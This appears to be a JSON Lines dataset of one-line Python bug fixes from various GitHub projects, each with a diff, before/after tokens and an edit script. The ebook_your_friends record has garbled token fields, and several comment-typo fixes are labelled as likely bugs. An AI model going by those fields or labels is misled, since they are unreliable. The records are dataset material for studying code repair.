{"project": "isida", "commit_sha": "b9e33b02f3f9a89bc6fc1bd69cd27b5e7c06bc01", "parent_sha": "37ece5d8835b80800e68a0285164046e57e9b757", "file_path": "plugins/turn.py", "project_url": "https://github.com/cobrab11/isida", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def turner(type, jid, nick, text):\n \t\t\t\tnotur = 0\n \t\t\t\tbreak\n \t\tif notur: msg += tex\n-\tif get_config(getRoom(room),'censor'): msg = to_censore(msg)\n+\tif get_config(getRoom(jid),'censor'): msg = to_censore(msg)\n \tsend_msg('groupchat', jid, '', msg)\n \n def append_to_turner(room,jid,nick,type,text):\n", "before": "if get_config ( getRoom ( room ) , 'censor' ) : msg = to_censore ( msg )", "after": "if get_config ( getRoom ( jid ) , 'censor' ) : msg = to_censore ( msg )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:room\", 3, 24, 3, 28], \"jid\"]]"}
{"project": "isida", "commit_sha": "728f732fd4f9ab37db3a7aad7ee6bcd87afde0cd", "parent_sha": "205ee84103f7f8b0f1be88a04fcd4b8a88ba2225", "file_path": "plugins/juick.py", "project_url": "https://github.com/cobrab11/isida", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -131,7 +131,7 @@ def juick_tag_user(type, jid, nick, text):\n \t\ttry: mlen = int(text.split(' ')[1])\r\n \t\texcept: mlen = juick_tag_user_limit\r\n \t\ttext = text.split(' ')[0]\r\n-\t\tif mlen > juick_tag_user_msx: mlen = juick_tag_user_max\r\n+\t\tif mlen > juick_tag_user_max: mlen = juick_tag_user_max\r\n \t\tlink = 'http://juick.com/last?tag='+text.encode('utf-8').replace('\\\\x','%').replace(' ','%20')\r\n \t\tbody = urllib.urlopen(link).read()\r\n \t\tbody = rss_replace(html_encode(body))\r\n", "before": "if mlen > juick_tag_user_msx : mlen = juick_tag_user_max", "after": "if mlen > juick_tag_user_max : mlen = juick_tag_user_max", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:juick_tag_user_msx\", 3, 13, 3, 31], \"juick_tag_user_max\"]]"}
{"project": "bokeh", "commit_sha": "4b3dd6d508df489ab02bd2e084243efe53c79158", "parent_sha": "fcf95e084608e0ffa6167a47ed2cc5585e0a9898", "file_path": "bokeh/session.py", "project_url": "https://github.com/suqi/bokeh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -380,7 +380,7 @@ class Session(object):\n         since it's inside document._models\n         Args:\n             obj : object to be updated.. this is used just for typename and id\n-            docuemnt : document instance.  object should be inside the document\n+            document : document instance.  object should be inside the document\n", "before": "docuemnt : document instance . object should be inside the document", "after": "document : document instance . object should be inside the document", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:docuemnt\", 3, 13, 3, 21], \"document\"]]"}
{"project": "dosenet-raspberrypi", "commit_sha": "190c41233d419a03ed30c6846e810045f789d2ed", "parent_sha": "5f6ff816fddc4a9d211960cd2f4e29dd60b91769", "file_path": "GUI_interface.py", "project_url": "https://github.com/ludicao/dosenet-raspberrypi", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,7 +31,7 @@ def weather_test(btn):\n         results=csv.writer(open(filename, \"ab+\"), delimiter = \",\")\n         metadata=[\"Time\", \"Temp (C)\",\"Pressure (hPa)\", \"Humidity (%)\"]\n         results.writerow(metadata)\n-        global job\n+        global job1\n         if running == True:\n             date_time = datetime.datetime.now()\n             degrees = sensor.read_temperature()\n", "before": "global job", "after": "global job1", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:job\", 3, 16, 3, 19], \"job1\"]]"}
{"project": "azure-data-lake-store-python", "commit_sha": "2fc9dfd7fe3f558678e1a510e403f7b4643b7906", "parent_sha": "0e5ac41774097e89a21f3843a32e8e88faa7d731", "file_path": "azure/datalake/store/multithread.py", "project_url": "https://github.com/clehene/azure-data-lake-store-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -494,7 +494,7 @@ def merge_chunks(adlfs, outfile, files, shutdown_event=None, overwrite=False):\n             if (overwrite):\n                 adlfs.remove(outfile)\n             else:\n-                raise FileExistsError(rpath)\n+                raise FileExistsError(outfile)\n \n         adlfs.concat(outfile, files, delete_source=True)\n     except Exception as e:\n", "before": "raise FileExistsError ( rpath )", "after": "raise FileExistsError ( outfile )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:rpath\", 3, 39, 3, 44], \"outfile\"]]"}
{"project": "dynamixel_motor", "commit_sha": "d7d4b7b0a8d4dc3073434028fe15deb75837d59a", "parent_sha": "ed06a640d529c3638e8760cd1233e66e8942f577", "file_path": "dynamixel_controllers/src/dynamixel_controllers/joint_trajectory_action_controller.py", "project_url": "https://github.com/pazeshun/dynamixel_motor", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -313,7 +313,7 @@ class JointTrajectoryActionController():\n                             cur_pos = self.joint_states[joint].current_pos\n                             \n                             motor_id = self.joint_to_controller[joint].motor_id\n-                            pos = self.joint_to_controller[joint].pos_rad_to_raw(current_pos)\n+                            pos = self.joint_to_controller[joint].pos_rad_to_raw(cur_pos)\n                             \n                             vals.append((motor_id,pos))\n                             \n", "before": "pos = self . joint_to_controller [ joint ] . pos_rad_to_raw ( current_pos )", "after": "pos = self . joint_to_controller [ joint ] . pos_rad_to_raw ( cur_pos )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:current_pos\", 3, 82, 3, 93], \"cur_pos\"]]"}
{"project": "InstaPy", "commit_sha": "90939d5aa59a258d5717ed0c3d06b6cec32eaa8a", "parent_sha": "7d9ce0e343ba0fc6c3ac567c3f75363bb64f3634", "file_path": "instapy/commenters_util.py", "project_url": "https://github.com/anyulled/InstaPy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -266,7 +266,7 @@ def extract_information(browser, username, daysold, max_pic):\n     # remove duplicates preserving order (that's why not using set())\n     user_commented_list = []\n     last = ''\n-    for index, value in enumerate(user_commented_total_list):\n+    for index, _ in enumerate(user_commented_total_list):\n         if username.lower() != user_commented_total_list[index]:\n             if (last != user_commented_total_list[index] and 'p' not in\n                     user_commented_total_list[index]):\n", "before": "for index , value in enumerate ( user_commented_total_list ) : if username . lower ( ) != user_commented_total_list [ index ] : if ( last != user_commented_total_list [ index ] and 'p' not in user_commented_total_list [ index ] ) : ", "after": "for index , _ in enumerate ( user_commented_total_list ) : if username . lower ( ) != user_commented_total_list [ index ] : if ( last != user_commented_total_list [ index ] and 'p' not in user_commented_total_list [ index ] ) : ", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:value\", 3, 16, 3, 21], \"_\"]]"}
{"project": "performance", "commit_sha": "4369f90044c37a3b3cc9655ada38f6ada4c7029e", "parent_sha": "8fde03a24280da5f4130b784fe58d20207d7a8ad", "file_path": "scripts/bench_revisions.py", "project_url": "https://github.com/willingc/performance", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -176,7 +176,7 @@ class Benchmark(object):\n         except configparser.NoSectionError:\n             pass\n         else:\n-            for revision, name in revisons:\n+            for revision, name in revisions:\n                 self.revisions.append((revision, name))\n \n         if self.upload and any(not getattr(self, attr)\n", "before": "revision , name in revisons : self . revisions . append ( ( revision , name ) )", "after": "revision , name in revisions : self . revisions . append ( ( revision , name ) )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:revisons\", 3, 35, 3, 43], \"revisions\"]]"}
{"project": "bokeh", "commit_sha": "0d50a072a627a8cfb1385604f84a37321a05fda0", "parent_sha": "eedb84ebbedfd128745af387b26462842fbd6057", "file_path": "scripts/issues.py", "project_url": "https://github.com/suqi/bokeh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -283,7 +283,7 @@ def issue_line(issue):\n def generate_changelog(issues, after, heading, rtag=False):\n     \"\"\"Prints out changelog.\"\"\"\n     relevent = relevant_issues(issues, after)\n-    relevent = sorted(relevent, key=ISSUES_SORT_KEY)\n+    relevent = sorted(relevent, key=ISSUES_BY_SECTION)\n \n     def write(func, endofline=\"\", append=\"\"):\n         func(heading + '\\n' + '-' * 20 + endofline)\n", "before": "relevent = sorted ( relevent , key = ISSUES_SORT_KEY )", "after": "relevent = sorted ( relevent , key = ISSUES_BY_SECTION )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:ISSUES_SORT_KEY\", 3, 37, 3, 52], \"ISSUES_BY_SECTION\"]]"}
{"project": "folium", "commit_sha": "d17ccfd52ecaa41e9a0b78b0775845417daef986", "parent_sha": "2ac2628d8a9db49f4638dd3201938e8078618a3b", "file_path": "folium/map.py", "project_url": "https://github.com/rdd9999/folium", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -72,7 +72,7 @@ def _format_lat_lon(values):\n             values = [float(val) for val in values]\n         except:\n             raise ValueError(\"Location values should be numeric, {} is not a number\".format(val))\n-        return value\n+        return values\n \n class LegacyMap(MacroElement):\n", "before": "return value", "after": "return values", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:value\", 3, 16, 3, 21], \"values\"]]"}
{"project": "InstaPy", "commit_sha": "ed1c861cdfcf0c7008cafccd2bd882d425346bfb", "parent_sha": "cc7c65f04a2a98a1a1da2f1e8a1e5ddfdba1a84b", "file_path": "instapy/comment_util.py", "project_url": "https://github.com/anyulled/InstaPy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def comment_image(browser, comments):\n     # print(u'--> Commented: {}'.format(rand_comment))\n     print(\"--> Commented: \" + rand_comment.encode('utf-8'))\n     sleep(2)\n-  except TimeoutError:\n+  except TimeoutException:\n     print(\"--> Warning: Comment box could not be found within an acceptable ammount of time, skipping comment\")\n \n \n", "before": "TimeoutError : print ( \"--> Warning: Comment box could not be found within an acceptable ammount of time, skipping comment\" )", "after": "TimeoutException : print ( \"--> Warning: Comment box could not be found within an acceptable ammount of time, skipping comment\" )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:TimeoutError\", 3, 10, 3, 22], \"TimeoutException\"]]"}
{"project": "flutterfuck", "commit_sha": "fe3a0bd669f6327e0df0b7705d3eb8d8f59cb300", "parent_sha": "d916d763b852e2aba5755a7e0e8ffd60e8f7fe8d", "file_path": "willie/modules/adminchannel.py", "project_url": "https://github.com/CoRD-Dev/flutterfuck", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -245,7 +245,7 @@ def unquiet(bot, trigger):\n     quietmask = configureHostMask(quietmask)\n     if quietmask == '':\n         return\n-    bot.write(['MODE', opt, '-q', quietmask])\n+    bot.write(['MODE', channel, '-q', quietmask])\n \n \n @require_privilege(OP)\n", "before": "bot . write ( [ 'MODE' , opt , '-q' , quietmask ] )", "after": "bot . write ( [ 'MODE' , channel , '-q' , quietmask ] )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:opt\", 3, 24, 3, 27], \"channel\"]]"}
{"project": "flutterfuck", "commit_sha": "30077b5b3b847cadf879444ae4bf81f56d41432c", "parent_sha": "0e54954068afeba6611e57e11254c98716602feb", "file_path": "willie/modules/youtube.py", "project_url": "https://github.com/CoRD-Dev/flutterfuck", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -22,7 +22,7 @@ def setup(bot):\n     regex = re.compile('(youtube.com/watch\\S*v=|youtu.be/)([\\w-]+)')\n     if not bot.memory.contains('url_callbacks'):\n         bot.memory['url_callbacks'] = tools.WillieMemory()\n-    bot.memory['url_callbacks'][regex] = exclude\n+    bot.memory['url_callbacks'][regex] = ytinfo\n \n \n def ytget(bot, trigger, uri):\n", "before": "bot . memory [ 'url_callbacks' ] [ regex ] = exclude", "after": "bot . memory [ 'url_callbacks' ] [ regex ] = ytinfo", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:exclude\", 3, 42, 3, 49], \"ytinfo\"]]"}
{"project": "ykdl", "commit_sha": "75ef9ec08267efe3243147e90d4900805c2b78ba", "parent_sha": "e9693ee7ccacf4261dec671546e3f2a0b2f2ffa0", "file_path": "src/you_get/extractors/youku.py", "project_url": "https://github.com/YU-zreo/ykdl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -122,7 +122,7 @@ class Youku(VideoExtractor):\n             assert 'stream' in data1\n         except:\n             if 'error' in data1:\n-                if data['error']['code'] == -202:\n+                if data1['error']['code'] == -202:\n                     # Password protected\n                     self.password_protected = True\n                     self.password = input(log.sprint('Password: ', log.YELLOW))\n", "before": "if data [ 'error' ] [ 'code' ] == - 202 : self . password_protected = True self . password = input ( log . sprint ( 'Password: ' , log . YELLOW ) )", "after": "if data1 [ 'error' ] [ 'code' ] == - 202 : self . password_protected = True self . password = input ( log . sprint ( 'Password: ' , log . YELLOW ) )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:data\", 3, 20, 3, 24], \"data1\"]]"}
{"project": "flutterfuck", "commit_sha": "f07cc17f535b7078db0800741a7bd089f6e3bab2", "parent_sha": "48df3665d82671346050407ce42ff53d723a817e", "file_path": "sopel/web.py", "project_url": "https://github.com/CoRD-Dev/flutterfuck", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -135,7 +135,7 @@ def post(uri, query, limit_bytes=None, timeout=20, verify_ssl=True, return_heade\n     if not uri.startswith('http'):\n         uri = \"http://\" + uri\n-    u = requests.post(uri, timeout=timeout, verify=verify_ssl, data=qeury)\n+    u = requests.post(uri, timeout=timeout, verify=verify_ssl, data=query)\n     bytes = u.raw.read(limit_bytes)\n     headers = u.headers\n     u.close()\n", "before": "u = requests . post ( uri , timeout = timeout , verify = verify_ssl , data = qeury )", "after": "u = requests . post ( uri , timeout = timeout , verify = verify_ssl , data = query )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:qeury\", 2, 69, 2, 74], \"query\"]]"}
{"project": "kesha-was-biird", "commit_sha": "ed661a05a071dead69d13305fff7bb454b9ef0eb", "parent_sha": "dd14133e375a1463c8654d39863f51b4697dfad9", "file_path": "dialogs.py", "project_url": "https://github.com/whoozle/kesha-was-biird", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -102,7 +102,7 @@ def clear():\n \tcall('panel_draw')\n \n def get_source():\n-\treturn _sources\n+\treturn _source\n \n def get_heads_source():\n \treturn _heads_source\n", "before": "return _sources", "after": "return _source", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:_sources\", 3, 9, 3, 17], \"_source\"]]"}
{"project": "flutterfuck", "commit_sha": "b1d9d790f07c7a95aa88c8e7dd9ccfddbdc7d9c9", "parent_sha": "2ff287adaef5abebe861d78c5e1cdc89bd7b7a3f", "file_path": "willie/web.py", "project_url": "https://github.com/CoRD-Dev/flutterfuck", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -150,7 +150,7 @@ class VerifiedHTTPSHandler(urllib2.HTTPSHandler):\n \n-    This is better than using urrlib2 directly, for it handles SSL verifcation, makes\n+    This is better than using urlib2 directly, for it handles SSL verifcation, makes\n     sure URI is utf8, and is shorter and easier to use.  Modules may use this\n     if they need a urllib2 object to execute .read() on.\n \n", "before": "This is better than using urrlib2 directly , for it handles SSL verifcation , makes", "after": "This is better than using urlib2 directly , for it handles SSL verifcation , makes", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:urrlib2\", 1, 31, 1, 38], \"urlib2\"]]"}
{"project": "flutterfuck", "commit_sha": "dcbe3d92d4b6585197c50e49bc7912a596f5d0b9", "parent_sha": "d5ce62ea6a4782af825bede3e05c18deb915447d", "file_path": "willie/web.py", "project_url": "https://github.com/CoRD-Dev/flutterfuck", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -95,7 +95,7 @@ def post(uri, query, limit_bytes=None, timeout=20, verify_ssl=True):\n     if not uri.startswith('http'):\n         uri = \"http://\" + uri\n-    u = get_urllib_object(uri, timeout=timeout, verify_ssl=verify_ssl, data=data)\n+    u = get_urllib_object(uri, timeout=timeout, verify_ssl=verify_ssl, data=query)\n     bytes = u.read(limit_bytes)\n     u.close()\n     return bytes\n", "before": "u = get_urllib_object ( uri , timeout = timeout , verify_ssl = verify_ssl , data = data )", "after": "u = get_urllib_object ( uri , timeout = timeout , verify_ssl = verify_ssl , data = query )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:data\", 2, 77, 2, 81], \"query\"]]"}
{"project": "cclib", "commit_sha": "39e6a99c37ea936622ab5d4b5c130debf885c064", "parent_sha": "fd001cbf668881f7f98fcf88944cb59c66c3c815", "file_path": "src/cclib/parser/nwchemparser.py", "project_url": "https://github.com/chemistry-scripts/cclib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -226,7 +226,7 @@ class NWChem(logfileparser.Logfile):\n                     atomname, desc, shells, funcs, types = line.split()\r\n                     atomelement = self.name2element(atomname)\r\n \r\n-                    self.shells[atomelement] = types\r\n+                    self.shells[atomname] = types\r\n                     atombasis_dict[atomelement] = int(funcs)\r\n                     line = next(inputfile)\r\n \r\n", "before": "self . shells [ atomelement ] = types", "after": "self . shells [ atomname ] = types", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:atomelement\", 3, 33, 3, 44], \"atomname\"]]"}
{"project": "dcos-e2e", "commit_sha": "8c9321c2681617b11d7b8775045d1d5516448080", "parent_sha": "e887bbb2496a9d83da6faa975cdde3ab6c3d6b78", "file_path": "admin/release.py", "project_url": "https://github.com/dcos/dcos-e2e", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -89,7 +89,7 @@ def update_homebrew(version_str: str, repository: Repository) -> None:\n     archive_url = repository.get_archive_link(\n         archive_format='tarball',\n-        version=version,\n+        version=version_str,\n     )\n \n     homebrew_formula_contents = get_homebrew_formula(\n", "before": "archive_url = repository . get_archive_link ( archive_format = 'tarball' , version = version , )", "after": "archive_url = repository . get_archive_link ( archive_format = 'tarball' , version = version_str , )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:version\", 2, 17, 2, 24], \"version_str\"]]"}
{"project": "tvm", "commit_sha": "8575b00aafdda86404d9031f8c16d5f5aa65dbbd", "parent_sha": "c3e730ef992c17663aacc07a5715961d508a0f60", "file_path": "python/tvm/relay/tensorrt.py", "project_url": "https://github.com/neo-ai/tvm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -221,7 +221,7 @@ def register_tensorrt_annotations(trt_version, use_implicit_batch=True):\n \n     def add_whitelist_fn(attrs, args):  # pylint: disable=unused-variable\n         shapes = [\n-            [int(x) if not isinstance(x, tvm.tir.expr.Any) else -1 for x in args.checked_type.shape]\n+            [int(x) if not isinstance(x, tvm.tir.expr.Any) else -1 for x in arg.checked_type.shape]\n             for arg in args\n         ]\n \n", "before": "shapes = [ [ int ( x ) if not isinstance ( x , tvm . tir . expr . Any ) else - 1 for x in args . checked_type . shape ] for arg in args ]", "after": "shapes = [ [ int ( x ) if not isinstance ( x , tvm . tir . expr . Any ) else - 1 for x in arg . checked_type . shape ] for arg in args ]", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:args\", 3, 77, 3, 81], \"arg\"]]"}
{"project": "burp_server_reports", "commit_sha": "58e63c4ec55b59690f6fc978e5e4987f4ba56d74", "parent_sha": "0d8a164ffff648b668e6c019a75002a300e49195", "file_path": "burp_reports/backends/burpui_api.py", "project_url": "https://github.com/pablodav/burp_server_reports", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -85,7 +85,7 @@ class Clients:\n \n             for cli in range(len(server_clients_stats)):\n                 client_stats = server_clients_stats[cli]\n-                clients_stats['server'] = server\n+                client_stats['server'] = server\n                 clients_stats.append(client_stats)\n \n         return clients_stats\n", "before": "clients_stats [ 'server' ] = server", "after": "client_stats [ 'server' ] = server", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:clients_stats\", 3, 17, 3, 30], \"client_stats\"]]"}
{"project": "burp_server_reports", "commit_sha": "64f8993f92fa3951ad461fcfdc31e335670c52ce", "parent_sha": "ab231bb7006d210427629a79790bb97db268223c", "file_path": "burp_reports/reports/clients_reports.py", "project_url": "https://github.com/pablodav/burp_server_reports", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -190,7 +190,7 @@ class BurpReports:\n                     server_name = ''\n                 det_status = ''\n                 # Generate list row with client's status and other data\n-                row = [client, burp_status, server_name, det_status]\n+                row = [burp_client, burp_status, server_name, det_status]\n \n                 csv_rows_inventory_status.append(row)\n \n", "before": "row = [ client , burp_status , server_name , det_status ]", "after": "row = [ burp_client , burp_status , server_name , det_status ]", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:client\", 3, 24, 3, 30], \"burp_client\"]]"}
{"project": "tape", "commit_sha": "e2d4bc341b8e3635069c7a5133f7c5b3d33b4601", "parent_sha": "87b547b9a735bd827f01d7cab64efda1dead6b95", "file_path": "tape_pytorch/main.py", "project_url": "https://github.com/songlab-cal/tape", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -142,7 +142,7 @@ class TaskRunner(object):\n         self.exp_name = exp_name\n         self.model = model\n         self.optimizer = optimizer\n-        self.config = config\n+        self.config = args\n         self.tokenizer = tokenizer\n         self.save_path = save_path\n         self.device = device\n", "before": "self . config = config", "after": "self . config = args", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:config\", 3, 23, 3, 29], \"args\"]]"}
{"project": "tvm", "commit_sha": "3e20c7dc2481810fadf07557495e6819303a26f3", "parent_sha": "d8a4166e4d890281c8d451bb9c4669382237295d", "file_path": "python/tvm/relay/testing/tf.py", "project_url": "https://github.com/neo-ai/tvm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -50,7 +50,7 @@ def ProcessGraphDefParam(graph_def):\n     Returns\n     -------\n     graph_def : Obj\n-        tensorflow graph devinition\n+        tensorflow graph definition\n \n", "before": "devinition", "after": "definition", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:devinition\", 3, 26, 3, 36], \"definition\"]]"}
{"project": "macsyfinder", "commit_sha": "f08097269788785855522d718dd051c1c11518d5", "parent_sha": "4d13afe3e0daf2805c062812d4855f6616fcbc4c", "file_path": "macsypy/scripts/macsyprofile.py", "project_url": "https://github.com/gem-pasteur/macsyfinder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ def get_profile_len(path: str) -> int:\n     Parse the HMM profile to extract the length and the presence of GA bit threshold\n \n     :param str path: The path to the hmm profile used to produced the hmm search output to analyse\n-    :return: the lentgh, presence of ga bit threshold\n+    :return: the length, presence of ga bit threshold\n     :rtype: tuple(int length, bool ga_threshold)\n", "before": "return : the lentgh , presence of ga bit threshold", "after": "return : the length , presence of ga bit threshold", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:lentgh\", 3, 18, 3, 24], \"length\"]]"}
{"project": "macsyfinder", "commit_sha": "efe2b1ccd8b2f8620fc5b0f881aadc874791f36e", "parent_sha": "f0b2992b8fa6a0f576217f904a4677e683aeb094", "file_path": "tests/test_registries.py", "project_url": "https://github.com/gem-pasteur/macsyfinder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -499,7 +499,7 @@ class ModelRegistryTest(MacsyTest):\n         model_simple_expected = ModelLocation(self.cfg, path=self.simple_dir)\n         models_received = md.models()\n         self.assertEqual(len(models_received), 2)\n-        self.assertIn(model_complex_expected, models_received)\n+        self.assertIn(model_simple_expected, models_received)\n         self.assertIn(model_complex_expected, models_received)\n \n     def test_str(self):\n", "before": "self . assertIn ( model_complex_expected , models_received )", "after": "self . assertIn ( model_simple_expected , models_received )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:model_complex_expected\", 3, 23, 3, 45], \"model_simple_expected\"]]"}
{"project": "macsyfinder", "commit_sha": "6357b153826c4dd4c42be3e4cc124b1de0d854a9", "parent_sha": "027342c0aa9a7db03ff50a53de7e5338af8d8170", "file_path": "macsypy/scripts/macsyfinder.py", "project_url": "https://github.com/gem-pasteur/macsyfinder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -486,7 +486,7 @@ def rejected_clst_to_file(rejected_clusters, clst_file):\n     main entry point to MacSyFinder do some check before to launch :func:`main_search_systems` which is\n-    the real function that perfom a search\n+    the real function that perform a search\n \n     :param args: the arguments passed on the command line without the program name\n     :type args: List of string\n", "before": "launch : func : `main_search_systems` which is the real function that perfom a", "after": "launch : func : `main_search_systems` which is the real function that perform a", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:perfom\", 1, 28, 1, 34], \"perform\"]]"}
{"project": "uberserver", "commit_sha": "fcf8fefe9daa66ed25d9f8678a1ff4b354c375cc", "parent_sha": "fc8db3d37f26dda8754c6de7b7527f5b29800cf5", "file_path": "LegacyUsers.py", "project_url": "https://github.com/lunixbochs/uberserver", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -143,7 +143,7 @@ class UsersHandler:\n \tdef end_session(self, username): pass\r\n \t\r\n \tdef register_user(self, username, password, ip):\r\n-\t\tif len(user)>20: return False, 'Username too long'\r\n+\t\tif len(username) > 20: return False, 'Username too long'\r\n \t\tif self._root.censor:\r\n \t\t\tif not self._root.SayHooks._nasty_word_censor(user):\r\n \t\t\t\treturn False, 'Name failed to pass profanity filter.'\r\n", "before": "if len ( user ) > 20 : return False , 'Username too long'", "after": "if len ( username ) > 20 : return False , 'Username too long'", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:user\", 3, 10, 3, 14], \"username\"]]"}
{"project": "TaskPaper-Workflow", "commit_sha": "af09d8d3e143b3a930e17cacbb94d53a894c8243", "parent_sha": "dac1c226aa90231afcfc2c6f5d434dcdece517e3", "file_path": "python/taskpaperdate.py", "project_url": "https://github.com/krid78/TaskPaper-Workflow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ def handle_week(line, today, tomorrow, week, thisweek):\n         line += \" @today\"\n     elif thisweek > week:\n         line += \" @overdue\"\n-    elif thisweek+1 == tomorrow_week:\n+    elif week+1 == tomorrow_week:\n         line += \" @tomorrow\"\n \n     return line\n", "before": "elif thisweek + 1 == tomorrow_week : line += \" @tomorrow\"", "after": "elif week + 1 == tomorrow_week : line += \" @tomorrow\"", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:thisweek\", 3, 10, 3, 18], \"week\"]]"}
{"project": "ebook_your_friends", "commit_sha": "4203375b4eaabe73a341f6b3577a288b2d4cd34c", "parent_sha": "fa8a95dea5f92c6627db5697f2c7c40460488595", "file_path": "markov.py", "project_url": "https://github.com/amanda/ebook_your_friends", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -66,7 +66,7 @@ def fix_therest(text):\n     '''hacky tool to replace other stuff that has\n     been consistently wrong'''\n     gonna_hack = re.sub(r'gon na', r'gonna', text)\n-    quote_hack = re.sub(r\"\u201c\u201d\u201c\", r'', gonna)\n+    quote_hack = re.sub(r\"\u201c\u201d\u201c\", r'', gonna_hack)\n     return quote_hack\n \n \n", "before": "quote_hack = re . sub ( r\"\u201c\u201d\u201c\", r'',   onn a  ", "after": "quote_hack = re . sub ( r\"\u201c\u201d\u201c\", r'',   onn a hack) ", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier\", 3, 44, 3, 49], \"hack)\"]]"}
{"project": "course-management", "commit_sha": "fe996a4bb7b40747cc8868e5c63ac972728c84d0", "parent_sha": "74c014991098e301e1556bc7e5ec7d9c9c36474e", "file_path": "src/util/html_clean.py", "project_url": "https://github.com/fsr/course-management", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -6,7 +6,7 @@ USER_DESCR_ALLOWED_TAGS = bleach.ALLOWED_TAGS + ['h2', 'h3', 'h4', 'h5', 'h6']\n \n \n def clean_for_user_description(html):\n-    return bleach.clean(html, tags=DESCR_ALLOWED_TAGS, strip=True)\n+    return bleach.clean(html, tags=USER_DESCR_ALLOWED_TAGS, strip=True)\n \n \n def clean_for_description(html):\n", "before": "return bleach . clean ( html , tags = DESCR_ALLOWED_TAGS , strip = True )", "after": "return bleach . clean ( html , tags = USER_DESCR_ALLOWED_TAGS , strip = True )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:DESCR_ALLOWED_TAGS\", 3, 36, 3, 54], \"USER_DESCR_ALLOWED_TAGS\"]]"}
